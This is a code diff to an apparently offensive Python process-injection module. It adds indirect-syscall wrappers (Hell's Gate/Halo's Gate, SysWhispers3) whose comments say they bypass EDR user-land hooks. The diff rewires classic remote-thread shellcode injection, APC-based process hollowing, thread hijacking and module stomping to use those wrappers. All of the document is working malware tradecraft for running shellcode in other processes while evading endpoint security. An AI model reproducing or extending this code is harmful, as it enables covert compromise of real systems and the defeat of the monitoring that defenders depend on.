@@ -31,6 +31,15 @@ from dataclasses import dataclass, field
 from enum import Enum, auto
 import base64
 
+try:
+    from evasion.indirect_syscalls import SyscallManager, SyscallConfig, SyscallTechnique
+    INDIRECT_SYSCALLS_AVAILABLE = True
+except ImportError:
+    INDIRECT_SYSCALLS_AVAILABLE = False
+    SyscallManager = None
+    SyscallConfig = None
+    SyscallTechnique = None
+
 logger = logging.getLogger("process_injection")
 
 
@@ -197,6 +206,7 @@ class ProcessInjector:
         self.config = config or InjectionConfig()
         self._is_windows = sys.platform == 'win32'
         self._temp_files: List[str] = []
+        self.syscall_manager = None
         
         if self._is_windows:
             self._load_windows_apis()
@@ -230,8 +240,110 @@ class ProcessInjector:
             ]
             self.kernel32.CreateRemoteThread.restype = ctypes.c_void_p
             
+            # NEW: Initialize indirect syscall manager for EDR hook bypass
+            self.syscall_manager = None
+            if INDIRECT_SYSCALLS_AVAILABLE and self.config.use_syscalls:
+                try:
+                    sc_config = SyscallConfig(
+                        technique=SyscallTechnique.SYSWHISPERS3,
+                        use_indirect=True,
+                        detect_hooks=True,
+                        use_fresh_ntdll=False,
+                    )
+                    self.syscall_manager = SyscallManager(config=sc_config)
+                    logger.info("Indirect syscall manager initialized for process injection")
+                except Exception as e:
+                    logger.warning(f"Failed to initialize indirect syscall manager: {e}")
+                    self.syscall_manager = None
+            
         except Exception as e:
             print(f"Failed to load Windows APIs: {e}")
+    
+    # ============================================================
+    # INDIRECT SYSCALL WRAPPERS (Hell's Gate / Halo's Gate)
+    # ============================================================
+    def _use_indirect_syscalls(self) -> bool:
+        return self.syscall_manager is not None
+    
+    def _nt_open_process(self, pid: int, access: int = 0x1F0FFF) -> int:
+        if not self._use_indirect_syscalls():
+            return self.kernel32.OpenProcess(access, False, pid)
+        handle, _ = self.syscall_manager.open_process(pid, access)
+        return handle
+    
+    def _nt_create_thread(self, process_handle: int, start_address: int,
+                          parameter: int = 0, suspended: bool = False) -> Tuple[int, bool]:
+        if not self._use_indirect_syscalls():
+            tid = ctypes.c_uint(0)
+            h_thread = self.kernel32.CreateRemoteThread(
+                process_handle, None, 0, start_address, None,
+                0x04 if suspended else 0, ctypes.byref(tid)
+            )
+            return (h_thread, bool(h_thread))
+        
+        handle, result = self.syscall_manager.create_thread(
+            process_handle, start_address, parameter, suspended
+        )
+        return (handle, result.success)
+    
+    def _nt_queue_apc(self, thread_handle: int, apc_routine: int,
+                      arg1: int = 0, arg2: int = 0, arg3: int = 0) -> bool:
+        if not self._use_indirect_syscalls():
+            self.ntdll.NtQueueApcThread(thread_handle, apc_routine, arg1, arg2, arg3)
+            return True
+        
+        result = self.syscall_manager.queue_apc(thread_handle, apc_routine, arg1, arg2, arg3)
+        return result.success
+    
+    def _nt_allocate_virtual_memory(self, process_handle: int, address: int,
+                                     size: int, allocation_type: int,
+                                     protection: int) -> int:
+        if not self._use_indirect_syscalls():
+            return self.kernel32.VirtualAllocEx(
+                process_handle, address, size, allocation_type, protection
+            )
+        
+        addr, result = self.syscall_manager.allocate_memory(
+            process_handle, size, protection
+        )
+        return addr if result.success else 0
+    
+    def _nt_write_virtual_memory(self, process_handle: int, address: int,
+                                  data: bytes) -> bool:
+        if not self._use_indirect_syscalls():
+            written = ctypes.c_size_t(0)
+            return self.kernel32.WriteProcessMemory(
+                process_handle, address, data, len(data), ctypes.byref(written)
+            )
+        
+        buf = (ctypes.c_char * len(data)).from_buffer_copy(data)
+        result = self.syscall_manager.write_memory(process_handle, address, buf.raw)
+        return result.success
+    
+    def _nt_protect_virtual_memory(self, process_handle: int, address: int,
+                                    size: int, protection: int) -> bool:
+        if not self._use_indirect_syscalls():
+            old_protect = ctypes.c_ulong(0)
+            return self.kernel32.VirtualProtectEx(
+                process_handle, address, size, protection, ctypes.byref(old_protect)
+            )
+        
+        result = self.syscall_manager.protect_memory(process_handle, address, size, protection)
+        return result.success
+    
+    def _nt_unmap_view_of_section(self, process_handle: int, base_address: int) -> int:
+        if not self._use_indirect_syscalls():
+            return self.ntdll.NtUnmapViewOfSection(process_handle, base_address)
+        
+        result = self.syscall_manager.unmap_view_of_section(process_handle, base_address)
+        return result.return_value
+    
+    def _nt_close(self, handle: int) -> bool:
+        if not self._use_indirect_syscalls():
+            return self.kernel32.CloseHandle(handle)
+        
+        result = self.syscall_manager.close_handle(handle)
+        return result.success
     
     def find_target_process(self, 
                            preferred: List[str] = None,
@@ -306,58 +418,53 @@ class ProcessInjector:
             )
         
         try:
-            # Open target process
-            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+            # Open target process via indirect syscall (bypass OpenProcess hook)
+            h_process = self._nt_open_process(pid, PROCESS_ALL_ACCESS)
             if not h_process:
                 return InjectionResult(
                     success=False, technique="classic_crt", target_pid=pid,
                     thread_id=None, error="Failed to open process"
                 )
             
-            # Allocate memory in target
-            shellcode_addr = self.kernel32.VirtualAllocEx(
+            # Allocate memory in target via indirect syscall
+            shellcode_addr = self._nt_allocate_virtual_memory(
                 h_process, None, len(shellcode),
                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
             )
             if not shellcode_addr:
-                self.kernel32.CloseHandle(h_process)
+                self._nt_close(h_process)
                 return InjectionResult(
                     success=False, technique="classic_crt", target_pid=pid,
                     thread_id=None, error="Failed to allocate memory"
                 )
             
-            # Write shellcode
-            written = ctypes.c_size_t(0)
-            if not self.kernel32.WriteProcessMemory(
-                h_process, shellcode_addr, shellcode, 
-                len(shellcode), ctypes.byref(written)
-            ):
-                self.kernel32.CloseHandle(h_process)
+            # Write shellcode via indirect syscall
+            if not self._nt_write_virtual_memory(h_process, shellcode_addr, shellcode):
+                self._nt_close(h_process)
                 return InjectionResult(
                     success=False, technique="classic_crt", target_pid=pid,
                     thread_id=None, error="Failed to write memory"
                 )
             
-            # Create remote thread
-            thread_id = ctypes.c_uint(0)
-            h_thread = self.kernel32.CreateRemoteThread(
-                h_process, None, 0, shellcode_addr, None, 0,
-                ctypes.byref(thread_id)
+            # Create remote thread via indirect syscall (NtCreateThreadEx)
+            # This bypasses CreateRemoteThread user-land hooks
+            thread_handle, thread_ok = self._nt_create_thread(
+                h_process, shellcode_addr, 0, False
             )
             
-            self.kernel32.CloseHandle(h_process)
+            self._nt_close(h_process)
             
-            if not h_thread:
+            if not thread_ok or not thread_handle:
                 return InjectionResult(
                     success=False, technique="classic_crt", target_pid=pid,
                     thread_id=None, error="Failed to create thread"
                 )
             
-            self.kernel32.CloseHandle(h_thread)
+            self._nt_close(thread_handle)
             
             return InjectionResult(
                 success=True, technique="classic_crt", target_pid=pid,
-                thread_id=thread_id.value, error=None
+                thread_id=None, error=None
             )
             
         except Exception as e:
@@ -897,17 +1004,21 @@ def process_hollowing():
             
             result.allocated_addr = remote_mem
             
-            # Write shellcode
-            written = ctypes.c_size_t(0)
-            self.kernel32.WriteProcessMemory(
-                pi.hProcess, remote_mem, shellcode,
-                len(shellcode), ctypes.byref(written)
-            )
+            # Write shellcode via indirect syscall
+            if not self._nt_write_virtual_memory(pi.hProcess, remote_mem, shellcode):
+                self.kernel32.TerminateProcess(pi.hProcess, 0)
+                result.error = "Failed to write memory"
+                self._nt_close(pi.hThread)
+                self._nt_close(pi.hProcess)
+                return result
             
-            # Queue APC
-            self.ntdll.NtQueueApcThread(
-                pi.hThread, remote_mem, None, None, None
-            )
+            # Queue APC via indirect syscall (bypass NtQueueApcThread hook)
+            if not self._nt_queue_apc(pi.hThread, remote_mem):
+                result.error = "Failed to queue APC"
+                self.kernel32.TerminateProcess(pi.hProcess, 0)
+                self._nt_close(pi.hThread)
+                self._nt_close(pi.hProcess)
+                return result
             
             # Resume thread
             self.kernel32.ResumeThread(pi.hThread)
@@ -916,8 +1027,8 @@ def process_hollowing():
             result.thread_id = pi.dwThreadId
             result.status = InjectionStatus.SUCCESS
             
-            self.kernel32.CloseHandle(pi.hThread)
-            self.kernel32.CloseHandle(pi.hProcess)
+            self._nt_close(pi.hThread)
+            self._nt_close(pi.hProcess)
             
             return result
             
@@ -948,8 +1059,8 @@ def process_hollowing():
             return result
         
         try:
-            # Open process
-            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+            # Open process via indirect syscall
+            h_process = self._nt_open_process(pid, PROCESS_ALL_ACCESS)
             if not h_process:
                 result.error = "Failed to open process"
                 return result
@@ -957,37 +1068,37 @@ def process_hollowing():
             # Get main thread ID
             tid = self._get_main_thread(pid)
             if not tid:
-                self.kernel32.CloseHandle(h_process)
+                self._nt_close(h_process)
                 result.error = "Failed to get main thread"
                 return result
             
             # Open thread
             h_thread = self.kernel32.OpenThread(THREAD_ALL_ACCESS, False, tid)
             if not h_thread:
-                self.kernel32.CloseHandle(h_process)
+                self._nt_close(h_process)
                 result.error = "Failed to open thread"
                 return result
             
-            # Allocate memory
-            remote_mem = self.kernel32.VirtualAllocEx(
+            # Allocate memory via indirect syscall
+            remote_mem = self._nt_allocate_virtual_memory(
                 h_process, None, len(shellcode),
                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
             )
             
             if not remote_mem:
-                self.kernel32.CloseHandle(h_thread)
-                self.kernel32.CloseHandle(h_process)
+                self._nt_close(h_thread)
+                self._nt_close(h_process)
                 result.error = "Failed to allocate memory"
                 return result
             
             result.allocated_addr = remote_mem
             
-            # Write shellcode
-            written = ctypes.c_size_t(0)
-            self.kernel32.WriteProcessMemory(
-                h_process, remote_mem, shellcode,
-                len(shellcode), ctypes.byref(written)
-            )
+            # Write shellcode via indirect syscall
+            if not self._nt_write_virtual_memory(h_process, remote_mem, shellcode):
+                self._nt_close(h_thread)
+                self._nt_close(h_process)
+                result.error = "Failed to write memory"
+                return result
             
             # Suspend thread
             self.kernel32.SuspendThread(h_thread)
@@ -1050,8 +1161,8 @@ def process_hollowing():
             result.thread_id = tid
             result.status = InjectionStatus.SUCCESS
             
-            self.kernel32.CloseHandle(h_thread)
-            self.kernel32.CloseHandle(h_process)
+            self._nt_close(h_thread)
+            self._nt_close(h_process)
             
             return result
             
@@ -1126,8 +1237,8 @@ def process_hollowing():
             return result
         
         try:
-            # Open process
-            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+            # Open process via indirect syscall
+            h_process = self._nt_open_process(pid, PROCESS_ALL_ACCESS)
             if not h_process:
                 result.error = "Failed to open process"
                 return result
@@ -1143,51 +1254,46 @@ def process_hollowing():
                 module_base = self._inject_dll_for_stomping(h_process, stomp_dll)
             
             if not module_base:
-                self.kernel32.CloseHandle(h_process)
+                self._nt_close(h_process)
                 result.error = "Failed to find/inject stomp DLL"
                 return result
             
             # Parse PE to find .text section
             text_offset, text_size = self._find_text_section(stomp_dll)
             if not text_offset:
-                self.kernel32.CloseHandle(h_process)
+                self._nt_close(h_process)
                 result.error = "Failed to find .text section"
                 return result
             
             text_addr = module_base + text_offset
             
-            # Change memory protection
-            old_protect = ctypes.c_ulong(0)
-            self.kernel32.VirtualProtectEx(
-                h_process, text_addr, len(shellcode),
-                PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)
+            # Change memory protection via indirect syscall
+            self._nt_protect_virtual_memory(
+                h_process, text_addr, len(shellcode), PAGE_EXECUTE_READWRITE
             )
             
-            # Write shellcode
-            written = ctypes.c_size_t(0)
-            self.kernel32.WriteProcessMemory(
-                h_process, text_addr, shellcode,
-                len(shellcode), ctypes.byref(written)
-            )
+            # Write shellcode via indirect syscall
+            if not self._nt_write_virtual_memory(h_process, text_addr, shellcode):
+                self._nt_close(h_process)
+                result.error = "Failed to write shellcode"
+                return result
             
             result.allocated_addr = text_addr
             
-            # Create thread at stomped location
-            thread_id = ctypes.c_uint(0)
-            h_thread = self.kernel32.CreateRemoteThread(
-                h_process, None, 0, text_addr, None, 0,
-                ctypes.byref(thread_id)
+            # Create thread at stomped location via indirect syscall (NtCreateThreadEx)
+            thread_handle, thread_ok = self._nt_create_thread(
+                h_process, text_addr, 0, False
             )
             
-            if h_thread:
+            if thread_ok and thread_handle:
                 result.success = True
-                result.thread_id = thread_id.value
+                result.thread_id = None
                 result.status = InjectionStatus.SUCCESS
-                self.kernel32.CloseHandle(h_thread)
+                self._nt_close(thread_handle)
             else:
                 result.error = "Failed to create thread"
             
-            self.kernel32.CloseHandle(h_process)
+            self._nt_close(h_process)
             return result
             
         except Exception as e:
